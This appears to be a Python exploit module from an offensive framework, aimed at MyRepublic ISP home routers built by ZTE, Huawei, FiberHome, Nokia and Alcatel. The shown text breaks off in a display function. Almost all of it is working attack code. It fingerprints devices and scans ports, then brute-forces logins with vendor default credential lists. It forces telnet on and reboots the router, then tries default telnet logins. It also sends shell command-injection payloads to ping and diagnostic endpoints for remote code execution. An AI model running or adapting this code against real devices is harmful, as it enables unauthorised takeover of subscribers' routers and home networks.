#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MyRepublic Router Multi-Exploit Module
Enhanced Device Detection + CSRF Token + Login + Telnet + RCE
"""

import requests
import socket
import time
import re
import json
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.progress import Progress
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MODULE_INFO = {
    "name": "MyRepublic Router Multi-Exploit",
    "description": "Enhanced Detection → CSRF Token → Login → Telnet → RCE",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "Excellent",
    "references": [
        "MyRepublic ONT",
        "ZTE F609/F660/F670", 
        "Huawei HG8245/HG8247",
        "FiberHome EG8141A5/EG8145V5",
        "Nokia G-240W",
        "Alcatel I-240W"
    ]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "user"},
    "PASSWORD": {"description": "Password", "required": False, "default": "user1234"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "login", "telnet", "rce", "full"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
    "TELNET_PORT": {"description": "Telnet port", "required": False, "default": "23"},
}

class MyRepublicExploit:
    def __init__(self, target, port=80, proto="http", username="user", password="user1234", cmd="id", telnet_port=23):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.cmd = cmd
        self.telnet_port = telnet_port
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
        self.logged_in = False
        self.device_info = {}

    def test_connectivity(self):
        """Test basic connection first"""
        console.print(f"\n[bold yellow]Testing connection to {self.base_url}...[/bold yellow]")
        
        try:
            r = self.session.get(self.base_url, timeout=10)
            console.print(f"[green]✅ HTTP {r.status_code} - Router responsive[/green]")
            
            # Show server info
            server = r.headers.get('Server', 'Unknown')
            console.print(f"[dim]Server: {server}[/dim]")
            
            # Check if it's a router page
            if any(keyword in r.text.lower() for keyword in ['router', 'login', 'password', 'wifi', 'internet']):
                console.print("[green]✅ Router-like page detected[/green]")
            else:
                console.print("[yellow]⚠️  Page doesn't look like a router interface[/yellow]")
                
            return True
            
        except requests.exceptions.ConnectTimeout:
            console.print("[red]❌ Connection timeout - target may be down[/red]")
            return False
        except requests.exceptions.ConnectionError:
            console.print("[red]❌ Connection refused - check target IP/port[/red]")
            return False
        except Exception as e:
            console.print(f"[red]❌ Connection error: {e}[/red]")
            return False

    # ===================================================================
    # ENHANCED DEVICE DETECTION
    # ===================================================================
    def detect_device(self):
        console.print("\n[bold yellow]======== ENHANCED DEVICE DETECTION ========[/bold yellow]")
        
        # Test connectivity first
        if not self.test_connectivity():
            return False

        self.device_info = {
            'brand': 'Unknown',
            'model': 'Unknown',
            'firmware': 'Unknown',
            'hardware': 'Unknown',
            'serial': 'Unknown',
            'mac_address': 'Unknown',
            'chipset': 'Unknown',
            'bootloader': 'Unknown',
            'is_myrepublic': False,
            'vulnerable': False,
            'detection_methods': [],
            'open_ports': [],
            'services': []
        }

        try:
            with Progress() as progress:
                task1 = progress.add_task("[cyan]Scanning device...", total=100)
                
                # Method 1: Scan main page
                progress.update(task1, advance=10, description="[cyan]Scanning main page...")
                r = self.session.get(f"{self.base_url}/", timeout=10)
                self._analyze_main_page(r)
                
                # Method 2: Scan common info pages
                progress.update(task1, advance=20, description="[cyan]Scanning info pages...")
                info_pages = [
                    "/menu.html"
                ]
                for page in info_pages:
                    self._scan_info_page(page)
                    progress.update(task1, advance=2)
                
                # Method 3: Scan login page
                progress.update(task1, advance=10, description="[cyan]Scanning login page...")
                self._scan_login_page()
                
                # Method 4: Check headers and server info
                progress.update(task1, advance=10, description="[cyan]Analyzing server headers...")
                self._analyze_headers(r)
                
                # Method 5: Try to access API endpoints
                progress.update(task1, advance=20, description="[cyan]Checking API endpoints...")
                self._check_api_endpoints()
                
                # Method 6: Port scanning
                progress.update(task1, advance=10, description="[cyan]Scanning ports...")
                self._scan_ports()
                
                # Method 7: Service detection
                progress.update(task1, advance=10, description="[cyan]Detecting services...")
                self._detect_services()
                
                # Determine vulnerability
                progress.update(task1, advance=10, description="[cyan]Analyzing vulnerabilities...")
                self._determine_vulnerability()
                
                progress.update(task1, completed=100)
            
            # Display results
            self._display_detection_results()
            
            return True
            
        except Exception as e:
            console.print(f"[red]Detection error: {e}[/red]")
            return False

    def _analyze_main_page(self, response):
        """Analyze main page for device information"""
        html = response.text
        headers = response.headers
        
        # Brand detection dengan confidence scoring
        brands = {
            'ZTE': {'keywords': ['zte', 'f609', 'f660', 'f670', 'zxhn'], 'score': 0},
            'Huawei': {'keywords': ['huawei', 'hg8245', 'hg8247', 'hg8045'], 'score': 0},
            'FiberHome': {'keywords': ['fiberhome', 'eg8141', 'eg8145', 'an5506'], 'score': 0},
            'Nokia': {'keywords': ['nokia', 'g-240w'], 'score': 0},
            'Alcatel': {'keywords': ['alcatel', 'i-240w'], 'score': 0},
            'TP-Link': {'keywords': ['tp-link', 'tplink'], 'score': 0}
        }
        
        html_lower = html.lower()
        for brand, data in brands.items():
            for keyword in data['keywords']:
                if keyword in html_lower:
                    data['score'] += 1
        
        # Pilih brand dengan score tertinggi
        best_brand = max(brands.items(), key=lambda x: x[1]['score'])
        if best_brand[1]['score'] > 0:
            self.device_info['brand'] = best_brand[0]
            self.device_info['detection_methods'].append(f"Brand detected: {best_brand[0]} (score: {best_brand[1]['score']})")
        
        # Model detection dengan multiple patterns
        model_patterns = [
            r'model[^>]*>([^<]+)<',
            r'product[^>]*>([^<]+)<',
            r'device[^>]*>([^<]+)<',
            r'type[^>]*>([^<]+)<',
            r'(f6[0-9]{2}[a-z]?)',
            r'(hg[0-9]{4}[a-z]?)',
            r'(eg8141[a-z0-9]?)',
            r'(zxhn\s*[a-z]?[0-9]+[a-z]?)',
            r'(an5506[-\s]*[a-z0-9]+)',
            r'(i-240w[a-z]?)',
            r'(g-240w[a-z]?)',
            r'<title>([^<]+)</title>'
        ]
        
        for pattern in model_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                model = match.strip()
                if len(model) > 2:
                    self.device_info['model'] = model.upper()
                    self.device_info['detection_methods'].append(f"Model detected: {model}")
                    break

        # Firmware detection
        fw_patterns = [
            r'firmware[^>]*>([^<]+)<',
            r'version[^>]*>([^<]+)<',
            r'software[^>]*>([^<]+)<',
            r'fw[^>]*>([^<]+)<',
            r'sw[^>]*>([^<]+)<',
            r'v[0-9]+\.[0-9]+\.[0-9]+',
            r'[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+',
            r'v[0-9]+[a-z][0-9]+'
        ]
        
        for pattern in fw_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                fw = match.strip()
                if len(fw) > 4 and any(c.isdigit() for c in fw):
                    self.device_info['firmware'] = fw
                    self.device_info['detection_methods'].append(f"Firmware: {fw}")
                    break

        # MyRepublic specific detection
        myrepublic_indicators = ['myrepublic', 'republic', 'myrepublicont', 'mro', 'republicwifi']
        if any(indicator in html_lower for indicator in myrepublic_indicators):
            self.device_info['is_myrepublic'] = True
            self.device_info['detection_methods'].append("MyRepublic ISP branding detected")

        # Fallback: Check title tag
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        if title_match:
            title = title_match.group(1)
            self.device_info['detection_methods'].append(f"Page title: {title}")

    def _scan_info_page(self, page):
        """Scan specific info pages for details"""
        try:
            url = f"{self.base_url}{page}"
            r = self.session.get(url, timeout=5)
            if r.status_code == 200:
                html = r.text.lower()
                
                # Extract serial number
                serial_patterns = [
                    r'serial[^>]*>([^<]+)<',
                    r'sn[^>]*>([^<]+)<',
                    r'serial.number[^>]*>([^<]+)<',
                    r'serial_no[^>]*>([^<]+)<'
                ]
                
                for pattern in serial_patterns:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match and self.device_info['serial'] == 'Unknown':
                        serial = match.group(1).strip()
                        if len(serial) > 5:
                            self.device_info['serial'] = serial
                            self.device_info['detection_methods'].append(f"Serial from {page}")
                
                # Extract MAC address
                mac_pattern = r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})'
                match = re.search(mac_pattern, html, re.IGNORECASE)
                if match and self.device_info['mac_address'] == 'Unknown':
                    self.device_info['mac_address'] = match.group(1).upper()
                    self.device_info['detection_methods'].append(f"MAC from {page}")
                
                # Extract hardware version
                hw_patterns = [
                    r'hardware[^>]*>([^<]+)<',
                    r'hw[^>]*>([^<]+)<',
                    r'hardware.version[^>]*>([^<]+)<',
                    r'hw.version[^>]*>([^<]+)<'
                ]
                
                for pattern in hw_patterns:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match and self.device_info['hardware'] == 'Unknown':
                        hw = match.group(1).strip()
                        if len(hw) > 2:
                            self.device_info['hardware'] = hw
                            self.device_info['detection_methods'].append(f"Hardware from {page}")
                
                # Extract chipset info
                chipset_patterns = [
                    r'chipset[^>]*>([^<]+)<',
                    r'cpu[^>]*>([^<]+)<',
                    r'processor[^>]*>([^<]+)<'
                ]
                
                for pattern in chipset_patterns:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match and self.device_info['chipset'] == 'Unknown':
                        chipset = match.group(1).strip()
                        self.device_info['chipset'] = chipset
                        self.device_info['detection_methods'].append(f"Chipset from {page}")
                        
        except:
            pass

    def _scan_login_page(self):
        """Analyze login page for additional info"""
        try:
            url = f"{self.base_url}/login.html"
            r = self.session.get(url, timeout=5)
            if r.status_code == 200:
                html = r.text
                
                # Check for specific login form patterns
                if 'user1234' in html:
                    self.device_info['detection_methods'].append("Default credentials pattern: user/user1234")
                if 'admin' in html.lower() and 'password' in html.lower():
                    self.device_info['detection_methods'].append("Admin login form detected")
                
                # Look for copyright or footer info
                copyright_pattern = r'copyright[^>]*>([^<]+)<'
                match = re.search(copyright_pattern, html, re.IGNORECASE)
                if match:
                    copyright_info = match.group(1)
                    if 'zte' in copyright_info.lower():
                        self.device_info['brand'] = 'ZTE'
                    elif 'huawei' in copyright_info.lower():
                        self.device_info['brand'] = 'Huawei'
                    elif 'fiberhome' in copyright_info.lower():
                        self.device_info['brand'] = 'FiberHome'
                        
        except:
            pass

    def _analyze_headers(self, response):
        """Analyze HTTP headers for server info"""
        headers = response.headers
        
        # Server detection
        server = headers.get('Server', '').lower()
        if server:
            self.device_info['detection_methods'].append(f"Server: {server}")
            
            if 'boa' in server:
                self.device_info['services'].append('Boa Webserver')
            elif 'rompager' in server:
                self.device_info['services'].append('Rompager Webserver')
            elif 'lighttpd' in server:
                self.device_info['services'].append('Lighttpd Webserver')
            elif 'apache' in server:
                self.device_info['services'].append('Apache Webserver')
            elif 'nginx' in server:
                self.device_info['services'].append('Nginx Webserver')

        # X-Powered-By header
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            self.device_info['detection_methods'].append(f"X-Powered-By: {powered_by}")

    def _check_api_endpoints(self):
        """Check API endpoints for device info"""
        api_endpoints = [
            "/api/device/info", "/api/system/info", "/api/status",
            "/cgi-bin/luci/api/auth", "/cgi-bin/luci/api/system",
            "/goform/deviceinfo", "/goform/getStatus",
            "/json/api", "/json/status", "/rest/device"
        ]
        
        for endpoint in api_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=3)
                if r.status_code == 200:
                    self.device_info['detection_methods'].append(f"API accessible: {endpoint}")
                    
                    # Try to parse JSON response
                    try:
                        data = r.json()
                        if 'model' in data and self.device_info['model'] == 'Unknown':
                            self.device_info['model'] = str(data['model'])
                        if 'version' in data and self.device_info['firmware'] == 'Unknown':
                            self.device_info['firmware'] = str(data['version'])
                        if 'serial' in data and self.device_info['serial'] == 'Unknown':
                            self.device_info['serial'] = str(data['serial'])
                        if 'mac' in data and self.device_info['mac_address'] == 'Unknown':
                            self.device_info['mac_address'] = str(data['mac'])
                    except:
                        # Jika bukan JSON, coba parsing manual
                        content = r.text.lower()
                        if 'model' in content:
                            self.device_info['detection_methods'].append(f"Model info in API: {endpoint}")
            except:
                pass

    def _scan_ports(self):
        """Scan common ports"""
        common_ports = [21, 22, 23, 53, 80, 443, 8080, 8443, 7547, 9090]
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target, port))
                sock.close()
                
                if result == 0:
                    self.device_info['open_ports'].append(port)
                    
                    # Map ports to services
                    port_services = {
                        21: 'FTP', 22: 'SSH', 23: 'Telnet', 53: 'DNS',
                        80: 'HTTP', 443: 'HTTPS', 8080: 'HTTP-Alt',
                        8443: 'HTTPS-Alt', 7547: 'TR-069', 9090: 'Web-Admin'
                    }
                    
                    if port in port_services:
                        self.device_info['services'].append(port_services[port])
                        
            except:
                pass

    def _detect_services(self):
        """Detect running services"""
        # Cek TR-069
        try:
            r = self.session.get(f"{self.base_url}:7547", timeout=3)
            if r.status_code == 200:
                self.device_info['services'].append('TR-069 ACS')
        except:
            pass
            
        # Cek SSH
        if 22 in self.device_info['open_ports']:
            self.device_info['services'].append('SSH Service')
            
        # Cek Telnet
        if 23 in self.device_info['open_ports']:
            self.device_info['services'].append('Telnet Service')

    def _determine_vulnerability(self):
        """Determine if device is vulnerable based on detected info"""
        # Vulnerable models
        vulnerable_models = [
            'F609', 'F660', 'F670', 'HG8245', 'HG8247', 
            'EG8141A5', 'EG8145V5', 'ZXHN F670', 'AN5506',
            'I-240W', 'G-240W'
        ]
        
        # Vulnerable firmware versions
        vulnerable_firmware = ['V2.1', 'V2.0', 'V1.0', 'V1.1', 'V2.3.1', 'V1.0.0', 'V2.0.0']
        
        # Vulnerable services
        vulnerable_services = ['Telnet Service', 'TR-069 ACS', 'Boa Webserver']
        
        model_vulnerable = any(vuln_model in self.device_info['model'] for vuln_model in vulnerable_models)
        fw_vulnerable = any(vuln_fw in self.device_info['firmware'] for vuln_fw in vulnerable_firmware)
        service_vulnerable = any(service in self.device_info['services'] for service in vulnerable_services)
        
        self.device_info['vulnerable'] = model_vulnerable or fw_vulnerable or service_vulnerable or self.device_info['is_myrepublic']

    def _display_detection_results(self):
        """Display comprehensive detection results"""
        # Main device info table
        main_table = Table(show_header=True, header_style="bold cyan", title="📡 Device Information")
        main_table.add_column("Property", style="white", width=18)
        main_table.add_column("Value", style="green", width=32)
        
        main_table.add_row("Brand", f"[bold]{self.device_info['brand']}[/bold]")
        main_table.add_row("Model", f"[bold yellow]{self.device_info['model']}[/bold yellow]")
        main_table.add_row("Firmware", self.device_info['firmware'])
        main_table.add_row("Hardware", self.device_info['hardware'])
        main_table.add_row("Chipset", self.device_info['chipset'])
        main_table.add_row("Serial", self.device_info['serial'])
        main_table.add_row("MAC Address", self.device_info['mac_address'])
        main_table.add_row("MyRepublic", "✅ Yes" if self.device_info['is_myrepublic'] else "❌ No")
        
        console.print(main_table)
        
        # Network services table
        if self.device_info['open_ports'] or self.device_info['services']:
            network_table = Table(show_header=True, header_style="bold blue", title="🌐 Network Services")
            network_table.add_column("Open Ports", style="cyan", width=20)
            network_table.add_column("Services", style="magenta", width=30)
            
            ports_str = ", ".join(map(str, self.device_info['open_ports']))
            services_str = ", ".join(self.device_info['services'])
            
            network_table.add_row(ports_str, services_str)
            console.print(network_table)
        
        # Vulnerability assessment
        vuln_table = Table(show_header=True, header_style="bold red", title="⚠️  Vulnerability Assessment")
        vuln_table.add_column("Assessment", style="white", width=50)
        vuln_table.add_column("Status", style="white", width=10)
        
        status_icon = "✅" if self.device_info['vulnerable'] else "❌"
        status_text = "VULNERABLE" if self.device_info['vulnerable'] else "SECURE"
        status_style = "red" if self.device_info['vulnerable'] else "green"
        
        vuln_table.add_row("Overall Device Security", f"[{status_style}]{status_icon} {status_text}[/{status_style}]")
        
        if self.device_info['vulnerable']:
            reasons = []
            if any(vuln_model in self.device_info['model'] for vuln_model in ['F609', 'F660', 'F670', 'HG8245', 'EG8141']):
                reasons.append("Known vulnerable model")
            if any(vuln_fw in self.device_info['firmware'] for vuln_fw in ['V2.1', 'V2.0', 'V1.0']):
                reasons.append("Outdated firmware")
            if 'Telnet Service' in self.device_info['services']:
                reasons.append("Telnet service exposed")
            if self.device_info['is_myrepublic']:
                reasons.append("MyRepublic ISP device")
                
            for reason in reasons:
                vuln_table.add_row(f"  • {reason}", "🔓")
        
        console.print(vuln_table)
        
        # Detection methods
        if self.device_info['detection_methods']:
            console.print("\n[bold yellow]🔍 Detection Methods:[/bold yellow]")
            for method in self.device_info['detection_methods'][:8]:  # Show first 8 methods
                console.print(f"  • {method}")
            if len(self.device_info['detection_methods']) > 8:
                console.print(f"  • ... and {len(self.device_info['detection_methods']) - 8} more methods")

    # ===================================================================
    # LOGIN DENGAN CSRF TOKEN
    # ===================================================================
    def try_login(self):
        if self.logged_in:
            return True

        console.print(Panel(
            "[bold yellow]🔐 AUTHENTICATION ATTEMPT[/bold yellow]",
            border_style="yellow"
        ))
        
        # Credentials berdasarkan brand yang terdeteksi
        credentials = self._get_targeted_credentials()
        
        console.print(f"[cyan]Trying {len(credentials)} credential combinations...[/cyan]")
        
        for username, password in credentials:
            console.print(f"[cyan]Trying: {username}:{password}[/cyan]")
            
            try:
                # Ambil halaman login untuk dapat CSRF token
                login_url = f"{self.base_url}/login.html"
                
                console.print(f"[dim]Fetching login page: {login_url}[/dim]")
                r = self.session.get(login_url, timeout=10)
                
                if r.status_code != 200:
                    console.print(f"[red]Cannot access login page (HTTP {r.status_code})[/red]")
                    continue

                # Extract semua hidden fields (CSRF tokens)
                hidden_fields = {}
                for match in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*>', r.text, re.I):
                    name_match = re.search(r'name=["\']([^"\']+)["\']', match.group(0))
                    value_match = re.search(r'value=["\']([^"\']*)["\']', match.group(0))
                    if name_match:
                        field_name = name_match.group(1)
                        field_value = value_match.group(1) if value_match else ""
                        hidden_fields[field_name] = field_value

                if hidden_fields:
                    console.print(f"[dim]Found CSRF tokens: {list(hidden_fields.keys())}[/dim]")
                else:
                    console.print("[dim]No CSRF tokens found[/dim]")

                # Coba berbagai kombinasi parameter login
                login_attempts = [
                    {"username": username, "password": password},
                    {"user": username, "pwd": password},
                    {"usr": username, "pass": password},
                    {"login_name": username, "login_pass": password},
                    {"name": username, "passwd": password},
                    {"UserName": username, "Password": password},
                    {"userid": username, "password": password}
                ]

                for login_params in login_attempts:
                    # Gabungkan dengan hidden fields (CSRF tokens)
                    payload = login_params.copy()
                    payload.update(hidden_fields)
                    
                    # Tambahkan submit button jika belum ada
                    if "submit" not in payload and "Submit" not in payload:
                        payload["submit"] = "Login"

                    # Hide password in log
                    safe_payload = {}
                    for k, v in payload.items():
                        if any(pass_key in k.lower() for pass_key in ['pass', 'pwd']):
                            safe_payload[k] = '***'
                        else:
                            safe_payload[k] = v
                    
                    console.print(f"[dim]Sending payload: {safe_payload}[/dim]")

                    r_post = self.session.post(login_url, data=payload, timeout=10, allow_redirects=True)
                    
                    # Cek indicators of successful login
                    success = False
                    
                    # Indicator 1: Redirect ke halaman non-login
                    if r_post.status_code in [200, 302]:
                        if "login" not in r_post.url.lower() and r_post.url != login_url:
                            success = True
                    
                    # Indicator 2: Ada tombol/logout text
                    if "logout" in r_post.text.lower():
                        success = True
                    
                    # Indicator 3: Ada status/dashboard tanpa login form
                    if any(x in r_post.text.lower() for x in ["status", "dashboard", "welcome", "main"]):
                        if "login" not in r_post.text.lower() and "password" not in r_post.text.lower():
                            success = True
                    
                    # Indicator 4: Session cookies
                    if self.session.cookies and len(self.session.cookies) > 0:
                        success = True
                        
                    # Indicator 5: Response mengandung success message
                    if any(x in r_post.text.lower() for x in ["success", "welcome", "logged in"]):
                        success = True

                    if success:
                        self.logged_in = True
                        self.username = username
                        self.password = password
                        console.print(Panel(
                            f"[bold green]✅ LOGIN SUCCESS![/bold green]\n"
                            f"👤 Username: {username}\n"
                            f"🔑 Password: {password}\n"
                            f"🌐 Redirected to: {r_post.url}",
                            border_style="green"
                        ))
                        return True
                        
            except Exception as e:
                console.print(f"[red]Login error with {username}: {e}[/red]")
                continue

        console.print(Panel(
            "[red]❌ All login attempts failed[/red]\n"
            "Possible reasons:\n"
            "• Wrong credentials\n"
            "• Router uses different auth method\n"
            "• IP restriction enabled",
            border_style="red"
        ))
        return False

    def _get_targeted_credentials(self):
        """Get credentials based on detected device brand"""
        base_creds = [
            ("user", "user1234"),
            ("admin", "admin"),
            ("user", "user"),
            ("admin", "password"),
            ("root", "root"),
            ("support", "support"),
            ("guest", "guest"),
            ("operator", "operator")
        ]
        
        brand_specific_creds = {
            'ZTE': [("admin", "zte"), ("root", "Zte521"), ("admin", "Zte521")],
            'Huawei': [("admin", "huawei"), ("root", "admin"), ("admin", "Admin@huawei")],
            'FiberHome': [("admin", "fiberhome"), ("user", "user"), ("admin", "FHadmin")],
            'Nokia': [("admin", "nokia"), ("root", "root"), ("admin", "1234")],
            'Alcatel': [("admin", "alcatel"), ("root", "root"), ("admin", "1234")],
            'TP-Link': [("admin", "admin"), ("root", "admin"), ("admin", "1234")]
        }
        
        targeted_creds = base_creds.copy()
        if self.device_info['brand'] in brand_specific_creds:
            targeted_creds.extend(brand_specific_creds[self.device_info['brand']])
        
        return targeted_creds

    # ===================================================================
    # TELNET EXPLOITATION
    # ===================================================================
    def check_telnet(self):
        """Cek apakah telnet port terbuka"""
        console.print("[bold yellow][*] Checking Telnet port...[/bold yellow]")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.telnet_port))
            sock.close()
            
            if result == 0:
                console.print("[green]✅ Telnet port is OPEN[/green]")
                return True
            else:
                console.print("[red]❌ Telnet port is CLOSED[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]Telnet check error: {e}[/red]")
            return False

    def enable_telnet(self):
        """Enable telnet service"""
        if not self.logged_in:
            console.print("[red]Need login first to enable telnet[/red]")
            return False

        console.print(Panel(
            "[bold yellow]🔧 ENABLING TELNET SERVICE[/bold yellow]",
            border_style="yellow"
        ))
        
        # Endpoints untuk enable telnet
        endpoints = [
            "/goform/formTelnet",
            "/cgi-bin/luci/admin/telnet",
            "/api/telnet/enable",
            "/goform/telnet",
            "/cgi-bin/telnet.cgi"
        ]
        
        # Payloads untuk enable telnet
        payloads = [
            {"telnetd_enable": "1", "save": "Apply"},
            {"enable": "1", "telnet": "on"},
            {"status": "1", "action": "enable"},
            {"telnet": "1", "apply": "1"}
        ]
        
        for endpoint in endpoints:
            for data in payloads:
                try:
                    url = f"{self.base_url}{endpoint}"
                    console.print(f"[cyan]Trying: {endpoint}[/cyan]")
                    
                    r = self.session.post(url, data=data, timeout=10)
                    
                    if r.status_code == 200:
                        console.print(f"[green]✅ Telnet enable request sent to {endpoint}[/green]")
                        
                        # Coba reboot router
                        if self.reboot_router():
                            return True
                        else:
                            console.print("[yellow]Telnet enabled but reboot may be required manually[/yellow]")
                            return True
                            
                except Exception as e:
                    console.print(f"[red]Error with {endpoint}: {e}[/red]")
                    continue
        
        console.print("[red]❌ Failed to enable telnet on all endpoints[/red]")
        return False

    def reboot_router(self):
        """Reboot router untuk apply changes"""
        console.print("[yellow][*] Attempting to reboot router...[/yellow]")
        
        reboot_endpoints = [
            "/goform/formReboot",
            "/cgi-bin/luci/admin/reboot",
            "/api/system/reboot",
            "/goform/reboot"
        ]
        
        for endpoint in reboot_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                data = {"reboot": "1", "submit": "Reboot"}
                
                console.print(f"[dim]Trying reboot: {endpoint}[/dim]")
                r = self.session.post(url, data=data, timeout=10)
                
                if r.status_code == 200:
                    console.print(Panel(
                        "[bold red]🔄 ROUTER REBOOTING![/bold red]\n"
                        "Waiting 60 seconds for router to come back online...",
                        border_style="red"
                    ))
                    time.sleep(60)
                    return True
                    
            except Exception as e:
                continue
        
        console.print("[yellow]Reboot command may have failed - waiting 30s anyway[/yellow]")
        time.sleep(30)
        return True

    def wait_for_telnet(self, timeout=60):
        """Tunggu telnet port terbuka"""
        console.print(f"[bold yellow]⏳ Waiting up to {timeout}s for Telnet port {self.telnet_port}...[/bold yellow]")
        
        for i in range(timeout):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target, self.telnet_port))
                sock.close()
                
                if result == 0:
                    console.print(f"[bold green]✅ Telnet port OPEN after {i+1}s[/bold green]")
                    return True
                    
            except:
                pass
            
            # Juga cek HTTP untuk tahu kapan router online
            if i % 5 == 0:
                try:
                    self.session.get(f"{self.base_url}/", timeout=5)
                except:
                    pass
            
            time.sleep(1)
            if i % 10 == 0 and i > 0:
                console.print(f"[yellow]Still waiting... ({i}s)[/yellow]")
        
        console.print("[red]❌ Telnet port never opened[/red]")
        return False

    def connect_telnet(self):
        """Connect ke telnet service"""
        if not self.wait_for_telnet(timeout=60):
            return False

        console.print(Panel(
            "[bold yellow]🔌 CONNECTING TO TELNET[/bold yellow]",
            border_style="yellow"
        ))
        
        # Credentials untuk telnet
        telnet_creds = [
            ("user", "user1234"),
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "zte"),
            ("support", "support"),
            ("guest", "guest")
        ]

        for username, password in telnet_creds:
            console.print(f"[cyan]Trying telnet: {username}:{password}[/cyan]")
            
            try:
                # Buat socket connection
                tn = socket.socket()
                tn.settimeout(10)
                tn.connect((self.target, self.telnet_port))
                
                # Tunggu dan baca banner
                time.sleep(2)
                try:
                    banner = tn.recv(1024).decode(errors='ignore')
                    console.print(f"[dim]Telnet banner: {banner[:100]}...[/dim]")
                except:
                    pass
                
                # Login process
                tn.send(f"{username}\n".encode())
                time.sleep(1)
                tn.send(f"{password}\n".encode())
                time.sleep(2)
                
                # Test commands
                tn.send(b"id\n")
                time.sleep(2)
                tn.send(b"uname -a\n")
                time.sleep(2)
                tn.send(b"pwd\n")
                time.sleep(2)
                
                # Baca output
                output = b""
                for _ in range(10):
                    try:
                        data = tn.recv(4096)
                        if not data:
                            break
                        output += data
                    except:
                        break
                
                output_text = output.decode(errors='ignore')
                
                # Cek jika login successful
                if any(x in output_text for x in ["uid=", "root", "Linux", "#", "$"]):
                    console.print(Panel(
                        f"[bold green]🎉 TELNET SHELL GAINED![/bold green]\n"
                        f"🔑 Credentials: {username}:{password}",
                        border_style="green"
                    ))
                    show_output(output_text)
                    tn.close()
                    return True
                    
                tn.close()
                
            except Exception as e:
                console.print(f"[red]Telnet failed with {username}: {e}[/red]")
                continue

        console.print("[red]❌ All Telnet credentials failed[/red]")
        return False

    # ===================================================================
    # RCE EXPLOITATION
    # ===================================================================
    def exploit_rce(self):
        """Remote Code Execution"""
        if not self.logged_in:
            console.print("[red]Need login first for RCE[/red]")
            return False

        console.print(Panel(
            "[bold yellow]💥 ATTEMPTING REMOTE CODE EXECUTION[/bold yellow]",
            border_style="yellow"
        ))
        
        # Endpoints untuk RCE
        endpoints = [
            ("/goform/formPing", "ping_address"),
            ("/cgi-bin/luci/admin/network/diagnostic", "ping_address"),
            ("/api/network/ping", "host"),
            ("/cgi-bin/ping.cgi", "ping_address"),
            ("/goform/diagnostic", "command"),
            ("/cgi-bin/luci/admin/system/exec", "command"),
            ("/goform/exec", "cmd")
        ]
        
        # Command injection payloads
        payloads = [
            f"127.0.0.1; {self.cmd}",
            f"127.0.0.1 && {self.cmd}",
            f"127.0.0.1 | {self.cmd}",
            f"`{self.cmd}`",
            f"$({self.cmd})",
            f";{self.cmd};",
            f"|{self.cmd}|"
        ]
        
        for endpoint, param in endpoints:
            for payload in payloads:
                try:
                    url = f"{self.base_url}{endpoint}"
                    data = {param: payload}
                    
                    console.print(f"[dim]Trying: {endpoint} with {payload}[/dim]")
                    r = self.session.post(url, data=data, timeout=10)
                    
                    # Cek indicators of successful RCE
                    if any(x in r.text for x in ["uid=", "root", "bin/", "www-data"]):
                        console.print(Panel(
                            f"[bold green]🎯 RCE SUCCESS![/bold green]\n"
                            f"📍 Endpoint: {endpoint}\n"
                            f"⚡ Payload: {payload}",
                            border_style="green"
                        ))
                        show_output(r.text.strip())
                        return True
                        
                except Exception as e:
                    continue
        
        console.print(Panel(
            "[red]❌ All RCE attempts failed[/red]\n"
            "The router may be patched against command injection",
            border_style="red"
        ))
        return False

# ===================================================================
# DISPLAY FUNCTIONS
# ===================================================================
def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Feature", "Enhanced Detection → CSRF Token → Login → Telnet → RCE")
    table.add_row("Risk", "High")
    table.add_row("Supported Models", "ZTE, Huawei, FiberHome, Nokia, Alcatel")
    console.print(Panel(table, title="MyRepublic Router Exploit", border_style="red"))

def show_options(opts):
    table = Table(title="Options", box=None)
    table.add_column("Name", style="bold cyan")
